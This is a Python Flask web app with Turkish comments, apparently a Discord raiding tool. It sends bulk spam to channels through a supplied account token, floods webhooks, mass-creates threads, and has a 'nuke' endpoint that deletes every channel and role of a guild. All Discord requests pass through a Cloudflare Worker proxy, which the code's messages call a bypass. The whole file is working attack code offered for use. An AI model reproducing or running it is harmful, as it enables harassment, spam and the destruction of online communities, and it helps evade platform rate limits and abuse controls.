from flask import Flask, render_template, request, jsonify
import requests
import threading
import time

app = Flask(__name__)

# --- CLOUDFLARE WORKER PROXY ---
# İsteklerin bu URL üzerinden köprülenecek
PROXY_URL = "https://long-sound-d421.boorapolat.workers.dev/"

def discord_req(method, url, token, payload=None):
    """
    Tüm istekleri Cloudflare Worker üzerinden geçirir.
    Worker'ın gelen URL'yi hedef alacak şekilde yapılandırıldığını varsayar.
    """
    headers = {
        "Authorization": token, 
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
    }
    
    # İsteği Worker'a yönlendiriyoruz. 
    # Not: Worker'ın hedef URL'yi header veya query parametresi olarak bekleyip beklemediğine göre bu kısım değişebilir.
    # Genel kullanım: Worker gelen her şeyi hedefe paslar.
    try:
        if method == "POST": 
            return requests.post(PROXY_URL, json={"url": url, "method": "POST", "data": payload, "headers": headers}, timeout=10)
        if method == "DELETE": 
            return requests.post(PROXY_URL, json={"url": url, "method": "DELETE", "headers": headers}, timeout=10)
        if method == "GET": 
            return requests.post(PROXY_URL, json={"url": url, "method": "GET", "headers": headers}, timeout=10)
    except Exception as e:
        print(f"Proxy Hatası: {e}")
        return None

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/api/spam', methods=['POST'])
def api_spam():
    data = request.json
    def run():
        url = f"https://discord.com/api/v9/channels/{data['channel_id']}/messages"
        for _ in range(int(data['count'])):
            res = discord_req("POST", url, data['token'], {"content": data['message']})
            # Rate limit kontrolü
            if res and res.status_code == 429:
                wait = res.json().get('retry_after', 1)
                time.sleep(wait)
            time.sleep(int(data['delay'])/1000)
    threading.Thread(target=run).start()
    return jsonify({"msg": "Cloudflare Proxy üzerinden spam başlatıldı!"})

@app.route('/api/webhook', methods=['POST'])
def api_webhook():
    data = request.json
    def run():
        for _ in range(int(data['count'])):
            # Webhook'lar genelde proxy gerektirmez ama güvenlik için eklenebilir
            requests.post(data['url'], json={"content": data['message']})
            time.sleep(0.1)
    threading.Thread(target=run).start()
    return jsonify({"msg": "Webhook yaylım ateşi aktif."})

@app.route('/api/thread', methods=['POST'])
def api_thread():
    data = request.json
    def run():
        url = f"https://discord.com/api/v9/channels/{data['channel_id']}/threads"
        for _ in range(10):
            res = discord_req("POST", url, data['token'], {"name": data['thread_name'], "type": 11})
            if res and res.status_code == 201:
                t_id = res.json().get('id')
                discord_req("POST", f"https://discord.com/api/v9/channels/{t_id}/messages", data['token'], {"content": data['message']})
            time.sleep(0.8)
    threading.Thread(target=run).start()
    return jsonify({"msg": "Thread ordusu deploy ediliyor."})

@app.route('/api/nuke', methods=['POST'])
def api_nuke():
    data = request.json
    def run():
        token = data['token']
        guild_id = data['guild_id']
        
        if data['type'] in ['channels', 'all']:
            resp = discord_req("GET", f"https://discord.com/api/v9/guilds/{guild_id}/channels", token)
            if resp and resp.status_code == 200:
                for c in resp.json():
                    threading.Thread(target=discord_req, args=("DELETE", f"https://discord.com/api/v9/channels/{c['id']}", token)).start()
        
        if data['type'] in ['roles', 'all']:
            resp = discord_req("GET", f"https://discord.com/api/v9/guilds/{guild_id}/roles", token)
            if resp and resp.status_code == 200:
                for r in resp.json():
                    discord_req("DELETE", f"https://discord.com/api/v9/guilds/{guild_id}/roles/{r['id']}", token)
    
    threading.Thread(target=run).start()
    return jsonify({"msg": "Nuke ve Cloudflare Bypass devrede!"})

if __name__ == '__main__':
    app.run(debug=True, port=5000)
